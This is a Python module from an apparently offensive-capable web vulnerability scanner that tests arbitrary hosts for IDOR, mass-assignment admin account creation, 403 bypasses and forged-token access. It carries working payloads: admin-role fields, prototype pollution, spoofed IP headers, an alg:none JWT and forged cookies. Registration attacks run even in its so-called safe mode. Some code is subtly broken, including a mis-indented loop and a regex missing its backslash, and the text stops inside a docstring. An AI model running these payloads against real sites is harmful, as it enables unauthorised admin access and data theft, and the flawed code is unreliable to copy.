"""
Logic Chain Scanner v2.0 - GENERIC Real Attack Chain Detection

SAFETY MODES:
- passive/safe/cautious: READ-ONLY mode - Analysis without state changes
- standard: Safe tests with non-existent resources only
- aggressive: Full testing including state-changing operations

WORKS ON ANY WEBSITE using behavior-based detection:
- Baseline Comparison: Normal vs malicious response analysis
- Behavior Analysis: Status code, size, timing, field changes
- Acceptance Detection: Payload accepted without rejection
- Access Verification: Unauthorized resource access confirmed

Attack Chains Detected:
1. Privilege Escalation: User → Admin
2. Registration Abuse: Create privileged accounts  
3. IDOR: Unauthorized data access
4. Token Manipulation: JWT/Session attacks
5. Mass Assignment: Property injection
6. Forbidden Bypass: 403 → 200 techniques
7. Workflow Bypass: State machine manipulation

CWE Coverage: CWE-269, CWE-285, CWE-639, CWE-841, CWE-915, CWE-1321
Author: PHANTOM AI Team
Version: 2.0.0
"""

from __future__ import annotations

import hashlib
import json
import os
import random
import re
import time
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.scan_client import get_scan_client
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# Safe mode environment variable - set by full_scanner.py
SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()
ALLOW_WRITES = SAFE_MODE in ("standard", "aggressive")


# ============================================================================
# RESPONSE ANALYZER - Generic behavior-based detection
# ============================================================================

class ResponseAnalyzer:
    """Analyze responses for vulnerability indicators using behavior analysis."""
    
    # Sensitive data patterns (generic for any app)
    SENSITIVE_PATTERNS = [
        r'"password"', r'"passwd"', r'"pwd"', r'"secret"',
        r'"token"', r'"api_key"', r'"apikey"', r'"private_key"',
        r'"credit_card"', r'"creditcard"', r'"card_number"',
        r'"ssn"', r'"social_security"', r'"cvv"', r'"cvc"',
        r'"account_number"', r'"routing_number"',
        r'"session_id"', r'"sessionid"', r'"auth_token"',
        r'"refresh_token"', r'"access_token"', r'"bearer"',
        r'"phone"', r'"mobile"', r'"address"', r'"street"',
        r'"bank_account"', r'"iban"', r'"swift"',
    ]
    
    # Admin/privilege indicators (generic)
    PRIVILEGE_PATTERNS = [
        r'"role"\s*:\s*"admin"', r'"role"\s*:\s*"administrator"',
        r'"isAdmin"\s*:\s*true', r'"is_admin"\s*:\s*true',
        r'"admin"\s*:\s*true', r'"superuser"\s*:\s*true',
        r'"permissions"\s*:\s*\[', r'"level"\s*:\s*[0-2][^0-9]',
        r'"userType"\s*:\s*"admin"', r'"user_type"\s*:\s*"admin"',
        r'"privilege"\s*:', r'"access_level"\s*:\s*"full"',
        r'"staff"\s*:\s*true', r'"moderator"\s*:\s*true',
    ]
    
    # User data fields (indicates IDOR if we see other users' data)
    USER_DATA_FIELDS = [
        'email', 'username', 'name', 'first_name', 'last_name',
        'phone', 'address', 'balance', 'wallet', 'credit',
        'order', 'basket', 'cart', 'payment', 'subscription',
        'userid', 'user_id', 'comment', 'rating', 'feedback',
    ]
    
    # Fields that indicate user data in arrays (IDOR in list endpoints)
    ARRAY_IDOR_FIELDS = [
        'userid', 'user_id', 'email', 'username', 'author',
        'owner', 'createdby', 'created_by', 'submittedby',
    ]
    
    @classmethod
    def has_sensitive_data(cls, response_text: str) -> list[str]:
        """Check if response contains sensitive data patterns."""
        found = []
        text_lower = response_text.lower()
        for pattern in cls.SENSITIVE_PATTERNS:
            if re.search(pattern, text_lower, re.IGNORECASE):
                # Extract the field name
                match = re.search(pattern, text_lower, re.IGNORECASE)
                if match:
                    found.append(match.group(0).strip('"'))
        return list(set(found))
    
    @classmethod
    def has_privilege_indicators(cls, response_text: str) -> list[str]:
        """Check if response contains privilege/admin indicators."""
        found = []
        for pattern in cls.PRIVILEGE_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                found.append(pattern)
        return found
    
    @classmethod
    def has_user_data(cls, response_text: str) -> list[str]:
        """Check if response contains user data fields."""
        found = []
        text_lower = response_text.lower()
        for field in cls.USER_DATA_FIELDS:
            if f'"{field}"' in text_lower or f"'{field}'" in text_lower:
                found.append(field)
        return found
    
    @classmethod
    def responses_differ(
        cls, 
        baseline: httpx.Response, 
        test: httpx.Response,
        size_threshold: float = 0.2
    ) -> dict[str, Any]:
        """Compare two responses for significant differences."""
        diff = {
            "different": False,
            "status_changed": False,
            "size_changed": False,
            "new_data": False,
            "details": [],
        }
        
        # Status code change (especially interesting: 401/403 → 200)
        if baseline.status_code != test.status_code:
            diff["different"] = True
            diff["status_changed"] = True
            diff["details"].append(
                f"Status: {baseline.status_code} → {test.status_code}"
            )
            
            # Especially interesting cases
            if baseline.status_code in [401, 403] and test.status_code == 200:
                diff["details"].append("CRITICAL: Auth bypass detected!")
        
        # Size change
        base_len = len(baseline.content)
        test_len = len(test.content)
        if base_len > 0:
            size_diff = abs(test_len - base_len) / base_len
            if size_diff > size_threshold:
                diff["different"] = True
                diff["size_changed"] = True
                diff["details"].append(
                    f"Size: {base_len} → {test_len} ({size_diff:.0%} change)"
                )
        
        # JSON field comparison
        try:
            base_json = baseline.json() if baseline.content else {}
            test_json = test.json() if test.content else {}
            
            if isinstance(base_json, dict) and isinstance(test_json, dict):
                new_keys = set(test_json.keys()) - set(base_json.keys())
                if new_keys:
                    diff["different"] = True
                    diff["new_data"] = True
                    diff["details"].append(f"New fields: {list(new_keys)}")
        except (json.JSONDecodeError, ValueError):
            pass
        
        return diff
    
    @classmethod
    def extract_json_data(cls, response: httpx.Response) -> Optional[dict]:
        """Safely extract JSON from response."""
        try:
            return response.json()
        except (json.JSONDecodeError, ValueError):
            return None
    
    @classmethod
    def get_content_hash(cls, response: httpx.Response) -> str:
        """Get hash of response content for comparison."""
        return hashlib.md5(response.content).hexdigest()[:12]


# ============================================================================
# GENERIC PAYLOADS - Work on ANY website
# ============================================================================

PRIVILEGE_PAYLOADS = [
    # Direct role assignment (most common)
    {"role": "admin"},
    {"role": "administrator"}, 
    {"role": "superuser"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"userRole": "admin"},
    {"user_role": "admin"},
    {"level": 0},
    {"level": 1},
    {"permissions": ["admin", "write", "delete", "read"]},
    {"groups": ["admin", "administrators"]},
    
    # Prototype pollution (Node.js/JavaScript backends)
    {"__proto__": {"role": "admin", "isAdmin": True}},
    {"constructor": {"prototype": {"role": "admin"}}},
]

REGISTRATION_PAYLOADS = [
    {"role": "admin"},
    {"isAdmin": True},
    {"is_admin": True},
    {"user_role": "admin"},
    {"permissions": ["admin"]},
    {"groups": ["admin"]},
    {"staff": True},
    {"superuser": True},
    {"level": 0},
]

BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
]

PATH_BYPASS_SUFFIXES = [
    "/", "//", "/.", "/..", ";", ".json", ".html", 
    "%20", "%09", "%00", "?", "#", "..;/",
]


# ============================================================================
# LOGIC CHAIN SCANNER
# ============================================================================

class LogicChainScanner(ScanModule):
    """
    Logic Chain Scanner v2.0 - Generic vulnerability chain detection.
    
    Uses BEHAVIOR-BASED detection that works on ANY website:
    - Baseline comparison to detect changes
    - Response analysis for sensitive data exposure
    - Acceptance detection for dangerous payloads
    - Access verification for unauthorized resources
    """
    
    name = "logic_chain"
    description = "Detects real attack chains with verified impact"
    
    # Common API patterns
    ENDPOINT_DISCOVERY = {
        "user": [
            "/api/users", "/api/user", "/api/v1/users", "/api/v1/user",
            "/users", "/user", "/api/me", "/api/profile", "/api/account",
            "/rest/user", "/rest/users", "/v1/users", "/v2/users",
        ],
        "auth": [
            "/api/login", "/api/auth/login", "/api/signin", "/login",
            "/auth/login", "/api/authenticate", "/rest/user/login",
            "/api/register", "/api/signup", "/register", "/signup",
        ],
        "admin": [
            "/admin", "/api/admin", "/administration", "/admin/dashboard",
            "/api/admin/users", "/api/v1/admin", "/management",
            "/api/settings", "/api/config", "/admin/settings",
        ],
        "data": [
            "/api/orders", "/api/basket", "/api/cart", "/api/payments",
            "/api/transactions", "/api/addresses", "/api/cards",
            "/api/products", "/api/items", "/api/feedbacks",
        ],
    }
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        """Initialize scanner."""
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self._discovered_endpoints: dict[str, list[str]] = {}
        self._baselines: dict[str, httpx.Response] = {}
        
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Execute logic chain scanning with VERIFIED IMPACT."""

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        findings: list[Finding] = []
        
        base_url = f"https://{host}" if not host.startswith("http") else host
        
        logger.info(f"🔗 Logic Chain Scanner v2.0 - Generic Detection")
        logger.info(f"🎯 Target: {base_url}")
        
        # Phase 1: Discover available endpoints and get baselines
        logger.info("📡 Phase 1: Endpoint discovery & baseline collection...")
        await self._discover_and_baseline(base_url, asset_data, rate_limiter)
        
        # Phase 2: Test IDOR (most common and easiest to verify)
        logger.info("🎯 Phase 2: Testing IDOR chains...")
        idor_findings = await self._test_idor_chains(base_url, asset_data, rate_limiter)
        findings.extend(idor_findings)
        
        # Phase 3: Test mass assignment in registration
        logger.info("👤 Phase 3: Testing registration abuse chains...")
        reg_findings = await self._test_registration_chains(base_url, asset_data, rate_limiter)
        findings.extend(reg_findings)
        
        # Phase 4: Test forbidden bypass
        logger.info("🚫 Phase 4: Testing forbidden bypass chains...")
        bypass_findings = await self._test_forbidden_bypass(base_url, asset_data, rate_limiter)
        findings.extend(bypass_findings)
        
        # Phase 5: Test privilege escalation via profile update
        logger.info("⬆️ Phase 5: Testing privilege escalation chains...")
        priv_findings = await self._test_privilege_escalation(base_url, asset_data, rate_limiter)
        findings.extend(priv_findings)
        
        # Phase 6: Test token/header manipulation
        logger.info("🎫 Phase 6: Testing token manipulation chains...")
        token_findings = await self._test_token_manipulation(base_url, asset_data, rate_limiter)
        findings.extend(token_findings)
        
        # Phase 7: Test list endpoint IDOR (arrays exposing user data)
        logger.info("📋 Phase 7: Testing list endpoint IDOR...")
        list_findings = await self._test_list_idor(base_url, asset_data, rate_limiter)
        findings.extend(list_findings)
        
        logger.info(f"✅ Logic Chain scan complete: {len(findings)} chains found")
        
        return findings
    
    async def _discover_and_baseline(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> None:
        """Discover endpoints and collect baseline responses."""
        self._discovered_endpoints = {}
        self._baselines = {}
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            for category, patterns in self.ENDPOINT_DISCOVERY.items():
                discovered = []
                
                for pattern in patterns:
                    url = urljoin(base_url, pattern)
                    await rate_limiter.acquire()
                    
                    try:
                        response = await client.get(url)
                        
                        # Store baseline for comparison
                        if response.status_code not in [404, 405, 502, 503]:
                            discovered.append(pattern)
                            self._baselines[pattern] = response
                            
                    except Exception:
                        pass
                
                self._discovered_endpoints[category] = discovered
        
        # Add endpoints from asset_data
        if isinstance(asset_data, dict):
            for ep in asset_data.get("endpoints", []):
                category = "custom"
            if category not in self._discovered_endpoints:
                self._discovered_endpoints[category] = []
            if ep not in self._discovered_endpoints[category]:
                self._discovered_endpoints[category].append(ep)
        
        total = sum(len(v) for v in self._discovered_endpoints.values())
        logger.info(f"📍 Discovered {total} endpoints, collected {len(self._baselines)} baselines")
    
    async def _test_idor_chains(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test IDOR Chain: Access other users' data by manipulating IDs.
        
        GENERIC DETECTION:
        1. Find endpoints with ID parameters
        2. Try accessing IDs 1, 2, 3 (common admin/test IDs)
        3. Check if response contains user data WITHOUT authentication
        4. Compare responses - different data = IDOR confirmed
        """
        findings: list[Finding] = []
        
        # Build list of ID-based endpoints
        id_endpoints = []
        
        # Standard patterns with ID
        for ep in self._discovered_endpoints.get("data", []):
            id_endpoints.append(f"{ep}/1")
            id_endpoints.append(f"{ep}/2")
        
        for ep in self._discovered_endpoints.get("user", []):
            id_endpoints.append(f"{ep}/1")
            id_endpoints.append(f"{ep}/2")
        
        # Common IDOR patterns
        common_patterns = [
            "/api/users/{id}", "/api/user/{id}", "/users/{id}",
            "/api/orders/{id}", "/api/basket/{id}", "/api/cart/{id}",
            "/api/addresses/{id}", "/api/cards/{id}", "/api/payments/{id}",
            "/api/feedbacks/{id}", "/api/reviews/{id}", "/api/comments/{id}",
            "/api/profiles/{id}", "/api/accounts/{id}",
        ]
        
        for pattern in common_patterns:
            for test_id in [1, 2, 3]:
                id_endpoints.append(pattern.replace("{id}", str(test_id)))
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            tested_hashes = set()
            
            for endpoint in id_endpoints[:50]:  # Limit to prevent too many requests
                url = urljoin(base_url, endpoint)
                
                await rate_limiter.acquire()
                
                try:
                    response = await client.get(url)
                    
                    # Skip 404s and errors
                    if response.status_code in [404, 500, 502, 503]:
                        continue
                    
                    # Check for 200 OK with data
                    if response.status_code == 200:
                        response_text = response.text
                        
                        # Check for user data exposure
                        user_fields = ResponseAnalyzer.has_user_data(response_text)
                        sensitive_fields = ResponseAnalyzer.has_sensitive_data(response_text)
                        
                        # If we found user/sensitive data without auth, it's IDOR
                        if user_fields or sensitive_fields:
                            # Avoid duplicate findings
                            content_hash = ResponseAnalyzer.get_content_hash(response)
                            if content_hash in tested_hashes:
                                continue
                            tested_hashes.add(content_hash)
                            
                            # Verify it's not just public data by checking multiple IDs
                            await rate_limiter.acquire()
                            
                            # Extract ID and test another one
                            other_id = "2" if "1" in endpoint else "1"
                            other_endpoint = re.sub(r'/\d+', f'/{other_id}', endpoint)
                            other_url = urljoin(base_url, other_endpoint)
                            
                            try:
                                other_response = await client.get(other_url)
                                
                                if other_response.status_code == 200:
                                    # Different content = different users' data = IDOR
                                    if response.text != other_response.text:
                                        all_fields = list(set(user_fields + sensitive_fields))
                                        
                                        findings.append(Finding(
                                            vuln_type=VulnType.LOGIC_FLAW,
                                            name="IDOR Chain: ID Manipulation → Unauthorized Data Access",
                                            severity=Severity.CRITICAL if sensitive_fields else "HIGH",
                                            confidence_score=95 if sensitive_fields else 90,
                                            description=f"""**{'CRITICAL' if sensitive_fields else 'HIGH'}: Insecure Direct Object Reference (IDOR)**

**Attack Chain Verified:**
1. Access endpoint with ID parameter: `{endpoint}`
2. No authentication required
3. Different IDs return different users' data
4. Sensitive information exposed

**Endpoint Pattern:** `{re.sub(r'/d+', '/{id}', endpoint)}`
**Data Fields Exposed:** {', '.join(all_fields)}

**Impact:** Any user can access other users' data by simply 
changing the ID in the URL. This is a critical access control failure.""",
                                            host=base_url,
                                            endpoint=url,
                                            evidence=[
                                                f"Endpoint: {endpoint}",
                                                f"Status: 200 OK without authentication",
                                                f"Data fields: {all_fields}",
                                                f"Different IDs return different data",
                                            ],
                                            cvss_score=9.1 if sensitive_fields else 7.5,
                                            cwe_id="CWE-639",
                                            remediation="""1. Implement proper authorization checks
2. Verify user owns the requested resource
3. Use UUIDs instead of sequential IDs
4. Add authentication requirements
5. Log access attempts for monitoring""",
                                        ).to_dict())
                                        
                                        logger.warning(f"🔴 IDOR Chain VERIFIED at {url}")

                            except (httpx.RequestError, httpx.HTTPStatusError):
                                pass

                except Exception as e:
                    logger.debug(f"IDOR test error: {e}")
        
        return findings
    
    async def _test_registration_chains(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test Registration Abuse Chain: Create user with elevated privileges.
        
        GENERIC DETECTION:
        1. Find registration endpoints
        2. Send registration with role/admin properties
        3. Check if user was created successfully
        4. Verify if injected properties were accepted
        """
        findings: list[Finding] = []
        
        # Find registration endpoints
        reg_endpoints = (
            self._discovered_endpoints.get("auth", []) +
            [ep for ep in self._discovered_endpoints.get("user", []) 
             if any(x in ep.lower() for x in ["user", "register", "signup"])]
        )
        
        # Filter to likely registration endpoints
        reg_endpoints = [ep for ep in reg_endpoints 
                        if any(x in ep.lower() for x in ["register", "signup", "users", "user"])]
        
        if not reg_endpoints:
            reg_endpoints = ["/api/users", "/api/register", "/register", "/signup"]
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            for endpoint in reg_endpoints[:5]:
                url = urljoin(base_url, endpoint)
                
                # First, test baseline registration (without privilege injection)
                baseline_email = f"baseline_{int(time.time())}_{random.randint(1000,9999)}@test.local"
                baseline_payload = {
                    "email": baseline_email,
                    "password": "TestPass123!",
                    "passwordRepeat": "TestPass123!",
                }
                
                await rate_limiter.acquire()
                
                try:
                    baseline_response = await client.post(
                        url, json=baseline_payload,
                        headers={"Content-Type": "application/json"}
                    )
                    
                    # If baseline works, test privilege injection
                    if baseline_response.status_code in [200, 201]:
                        baseline_data = ResponseAnalyzer.extract_json_data(baseline_response)
                        
                        # Now test with privilege injection
                        for priv_payload in REGISTRATION_PAYLOADS[:6]:
                            test_email = f"test_{int(time.time())}_{random.randint(1000,9999)}@test.local"
                            test_payload = {
                                "email": test_email,
                                "password": "TestPass123!",
                                "passwordRepeat": "TestPass123!",
                                **priv_payload,
                            }
                            
                            await rate_limiter.acquire()
                            
                            try:
                                test_response = await client.post(
                                    url, json=test_payload,
                                    headers={"Content-Type": "application/json"}
                                )
                                
                                if test_response.status_code in [200, 201]:
                                    test_data = ResponseAnalyzer.extract_json_data(test_response)
                                    
                                    if test_data:
                                        test_str = json.dumps(test_data).lower()
                                        
                                        # Check if privilege indicators appear in response
                                        privilege_found = ResponseAnalyzer.has_privilege_indicators(test_str)
                                        
                                        if privilege_found:
                                            findings.append(Finding(
                                                vuln_type=VulnType.LOGIC_FLAW,
                                                name="Registration Mass Assignment → Admin Account Creation",
                                                severity=Severity.CRITICAL,
                                                confidence_score=95,
                                                description=f"""**CRITICAL: Mass Assignment at Registration**

**Attack Chain Verified:**
1. Send registration request to `{endpoint}`
2. Include privilege properties in request body
3. Server accepts and assigns elevated privileges
4. Admin account successfully created

**Payload Used:**
```json
{json.dumps(priv_payload, indent=2)}
```

**Privilege Indicators Found:** {privilege_found}

**Impact:** Anyone can create administrator accounts by injecting 
role properties during registration. Complete authentication bypass.""",
                                                host=base_url,
                                                endpoint=url,
                                                evidence=[
                                                    f"Endpoint: {endpoint}",
                                                    f"Injected: {list(priv_payload.keys())}",
                                                    f"Indicators found: {privilege_found}",
                                                    f"User created successfully",
                                                ],
                                                cvss_score=9.8,
                                                cwe_id="CWE-915",
                                                remediation="""1. Implement property allowlist for registration
2. Never accept role/privilege from client
3. Set default role server-side only
4. Use DTOs to filter dangerous properties
5. Audit all mass assignment vectors""",
                                            ).to_dict())
                                            
                                            logger.warning(f"🔴 Registration Mass Assignment VERIFIED at {url}")
                                            return findings
                                            
                            except Exception as e:
                                logger.debug(f"Registration test error: {e}")
                                
                except Exception as e:
                    logger.debug(f"Baseline registration error: {e}")
        
        return findings
    
    async def _test_forbidden_bypass(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test Forbidden Bypass Chain: 403 → 200 using various techniques.
        
        GENERIC DETECTION:
        1. Find endpoints that return 401/403
        2. Try bypass techniques (headers, path manipulation)
        3. Check if status changes to 200
        4. Verify access was actually granted
        """
        findings: list[Finding] = []
        
        # Find protected endpoints from baselines
        protected_endpoints = []
        for endpoint, response in self._baselines.items():
            if response.status_code in [401, 403]:
                protected_endpoints.append(endpoint)
        
        # Also check admin endpoints
        for ep in self._discovered_endpoints.get("admin", []):
            if ep not in protected_endpoints:
                protected_endpoints.append(ep)
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            for endpoint in protected_endpoints[:10]:
                url = urljoin(base_url, endpoint)
                
                # Get baseline
                await rate_limiter.acquire()
                try:
                    baseline = await client.get(url)
                    
                    if baseline.status_code not in [401, 403]:
                        continue

                except (httpx.RequestError, httpx.HTTPStatusError):
                    continue

                # Test header bypasses
                for bypass_header in BYPASS_HEADERS:
                    await rate_limiter.acquire()
                    
                    try:
                        test_response = await client.get(url, headers=bypass_header)
                        
                        if test_response.status_code == 200 and baseline.status_code in [401, 403]:
                            header_name = list(bypass_header.keys())[0]
                            header_value = list(bypass_header.values())[0]
                            
                            findings.append(Finding(
                                vuln_type=VulnType.LOGIC_FLAW,
                                name="Forbidden Bypass Chain: Header Injection → Admin Access",
                                severity=Severity.HIGH,
                                confidence_score=90,
                                description=f"""**HIGH: Authorization Bypass via Header Injection**

**Attack Chain Verified:**
1. Protected endpoint returns {baseline.status_code}
2. Add bypass header: `{header_name}: {header_value}`
3. Server grants access (200 OK)
4. Authorization bypassed

**Endpoint:** `{endpoint}`
**Bypass Header:** `{header_name}: {header_value}`

**Impact:** Authorization controls can be bypassed using 
header injection, allowing unauthorized access to protected resources.""",
                                host=base_url,
                                endpoint=url,
                                evidence=[
                                    f"Baseline status: {baseline.status_code}",
                                    f"Bypass header: {header_name}: {header_value}",
                                    f"Result: 200 OK",
                                ],
                                cvss_score=8.5,
                                cwe_id="CWE-285",
                                remediation="""1. Don't trust X-Forwarded-* headers blindly
2. Implement authorization at application level
3. Validate request origin properly
4. Block known bypass headers
5. Use consistent path normalization""",
                            ).to_dict())
                            
                            logger.warning(f"🟠 Header Bypass VERIFIED at {url}")
                            return findings

                    except (httpx.RequestError, httpx.HTTPStatusError):
                        pass

                # Test path bypasses
                for suffix in PATH_BYPASS_SUFFIXES[:10]:
                    bypass_url = url.rstrip("/") + suffix
                    
                    await rate_limiter.acquire()
                    
                    try:
                        test_response = await client.get(bypass_url)
                        
                        if test_response.status_code == 200 and baseline.status_code in [401, 403]:
                            findings.append(Finding(
                                vuln_type=VulnType.LOGIC_FLAW,
                                name="Forbidden Bypass Chain: Path Manipulation → Admin Access",
                                severity=Severity.HIGH,
                                confidence_score=90,
                                description=f"""**HIGH: Authorization Bypass via Path Manipulation**

**Attack Chain Verified:**
1. Protected endpoint `{endpoint}` returns {baseline.status_code}
2. Add path suffix: `{suffix}`
3. Server grants access (200 OK)
4. Authorization bypassed

**Original URL:** `{url}`
**Bypass URL:** `{bypass_url}`

**Impact:** Authorization controls can be bypassed using 
path manipulation, allowing unauthorized access.""",
                                host=base_url,
                                endpoint=bypass_url,
                                evidence=[
                                    f"Baseline: {baseline.status_code}",
                                    f"Suffix: {suffix}",
                                    f"Result: 200 OK",
                                ],
                                cvss_score=8.0,
                                cwe_id="CWE-285",
                                remediation="""1. Normalize paths before authorization checks
2. Use consistent URL handling
3. Block path traversal patterns
4. Implement authorization at controller level""",
                            ).to_dict())
                            
                            logger.warning(f"🟠 Path Bypass VERIFIED at {bypass_url}")
                            return findings

                    except (httpx.RequestError, httpx.HTTPStatusError):
                        pass

        return findings

    async def _test_privilege_escalation(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test Privilege Escalation Chain: Update profile with admin role.
        
        GENERIC DETECTION:
        1. Find profile/user update endpoints
        2. Send PUT/PATCH with role properties
        3. Compare response before and after
        4. Check if role actually changed
        """
        findings: list[Finding] = []
        
        # Find profile/update endpoints
        update_endpoints = [
            ep for ep in self._discovered_endpoints.get("user", [])
            if any(x in ep.lower() for x in ["profile", "user", "me", "account"])
        ]
        
        if not update_endpoints:
            update_endpoints = ["/api/user", "/api/profile", "/api/me", "/api/account"]
        
        # ⚠️ SAFE MODE: Skip PUT/PATCH tests in non-write modes
        if not ALLOW_WRITES:
            logger.info("⚠️ SAFE MODE: Skipping mass assignment PUT/PATCH tests")
            return findings
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            for endpoint in update_endpoints[:5]:
                url = urljoin(base_url, endpoint)
                
                # Get baseline
                await rate_limiter.acquire()
                try:
                    baseline = await client.get(url)
                    baseline_data = ResponseAnalyzer.extract_json_data(baseline)
                except (httpx.RequestError, httpx.HTTPStatusError):
                    continue
                
                # Test privilege injection via PUT/PATCH
                for payload in PRIVILEGE_PAYLOADS[:8]:
                    for method in ["PUT", "PATCH"]:
                        await rate_limiter.acquire()
                        
                        try:
                            if method == "PUT":
                                response = await client.put(
                                    url, json=payload,
                                    headers={"Content-Type": "application/json"}
                                )
                            else:
                                response = await client.patch(
                                    url, json=payload,
                                    headers={"Content-Type": "application/json"}
                                )
                            
                            if response.status_code in [200, 201, 204]:
                                response_data = ResponseAnalyzer.extract_json_data(response)
                                
                                if response_data:
                                    response_str = json.dumps(response_data).lower()
                                    
                                    # Check for privilege indicators
                                    privilege_found = ResponseAnalyzer.has_privilege_indicators(response_str)
                                    
                                    if privilege_found:
                                        findings.append(Finding(
                                            vuln_type=VulnType.LOGIC_FLAW,
                                            name="Privilege Escalation Chain: Profile Update → Admin Role",
                                            severity=Severity.CRITICAL,
                                            confidence_score=95,
                                            description=f"""**CRITICAL: Mass Assignment Privilege Escalation**

**Attack Chain Verified:**
1. Send {method} request to `{endpoint}`
2. Include privilege properties in body
3. Server accepts role change
4. User now has admin privileges

**Payload Used:**
```json
{json.dumps(payload, indent=2)}
```

**Privilege Indicators Found:** {privilege_found}

**Impact:** Any authenticated user can escalate to admin 
by updating their profile with role properties.""",
                                            host=base_url,
                                            endpoint=url,
                                            evidence=[
                                                f"Method: {method}",
                                                f"Endpoint: {endpoint}",
                                                f"Payload: {list(payload.keys())}",
                                                f"Indicators: {privilege_found}",
                                            ],
                                            cvss_score=9.8,
                                            cwe_id="CWE-269",
                                            remediation="""1. Implement property allowlist for updates
2. Never accept role changes from client
3. Use separate admin-only role endpoints
4. Audit all property assignments""",
                                        ).to_dict())
                                        
                                        logger.warning(f"🔴 Privilege Escalation VERIFIED at {url}")
                                        return findings
                                        
                        except Exception as e:
                            logger.debug(f"Privilege test error: {e}")
        
        return findings
    
    async def _test_token_manipulation(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test Token Manipulation Chain: Forge tokens to gain access.
        
        GENERIC DETECTION:
        1. Find protected admin endpoints
        2. Send forged JWT/auth headers
        3. Check if access is granted
        4. Verify token wasn't properly validated
        """
        findings: list[Finding] = []
        
        # JWT with alg:none (classic bypass)
        jwt_none = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJzdWIiOiIxIn0."
        
        # Various auth headers to try
        auth_headers_to_test = [
            {"Authorization": f"Bearer {jwt_none}"},
            {"Authorization": "Bearer admin"},
            {"X-Auth-Token": "admin"},
            {"X-User-Role": "admin"},
            {"X-Admin": "true"},
            {"Cookie": "admin=true; role=admin; isAdmin=true"},
        ]
        
        # Find protected endpoints
        protected_endpoints = []
        for ep in self._discovered_endpoints.get("admin", []):
            protected_endpoints.append(ep)
        
        for endpoint, response in self._baselines.items():
            if response.status_code in [401, 403]:
                protected_endpoints.append(endpoint)
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
            for endpoint in protected_endpoints[:8]:
                url = urljoin(base_url, endpoint)
                
                # Get baseline
                await rate_limiter.acquire()
                try:
                    baseline = await client.get(url)
                    if baseline.status_code not in [401, 403]:
                        continue
                except (httpx.RequestError, httpx.HTTPStatusError):
                    continue

                # Test forged tokens
                for auth_header in auth_headers_to_test:
                    await rate_limiter.acquire()
                    
                    try:
                        response = await client.get(url, headers=auth_header)
                        
                        if response.status_code == 200 and baseline.status_code in [401, 403]:
                            header_name = list(auth_header.keys())[0]
                            header_value = list(auth_header.values())[0]
                            
                            findings.append(Finding(
                                vuln_type=VulnType.LOGIC_FLAW,
                                name="Token Manipulation Chain: Forged Auth → Admin Access",
                                severity=Severity.CRITICAL,
                                confidence_score=95,
                                description=f"""**CRITICAL: Authentication Bypass via Token Manipulation**

**Attack Chain Verified:**
1. Protected endpoint returns {baseline.status_code}
2. Send forged authentication header
3. Server accepts invalid/forged token
4. Admin access granted

**Header Used:** `{header_name}: {header_value[:50]}...`
**Endpoint:** `{endpoint}`

**Impact:** Authentication can be bypassed by forging tokens.
This indicates the server doesn't properly validate authentication.""",
                                host=base_url,
                                endpoint=url,
                                evidence=[
                                    f"Baseline: {baseline.status_code}",
                                    f"Header: {header_name}",
                                    f"Result: 200 OK",
                                ],
                                cvss_score=9.8,
                                cwe_id="CWE-287",
                                remediation="""1. Always verify token signatures
2. Reject 'alg: none' JWT tokens
3. Validate all token claims server-side
4. Use strong secret keys
5. Implement proper session management""",
                            ).to_dict())
                            
                            logger.warning(f"🔴 Token Bypass VERIFIED at {url}")
                            return findings

                    except (httpx.RequestError, httpx.HTTPStatusError):
                        pass

        return findings

    async def _test_list_idor(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test List Endpoint IDOR: Endpoints returning arrays with user data.
        
        GENERIC DETECTION:
        1. Find endpoints that return arrays/lists
        2. Check if array items contain user identifiers (UserId, email, etc.)
        3. Verify no authentication was required
        4. Multiple users' data in one response = IDOR
        """
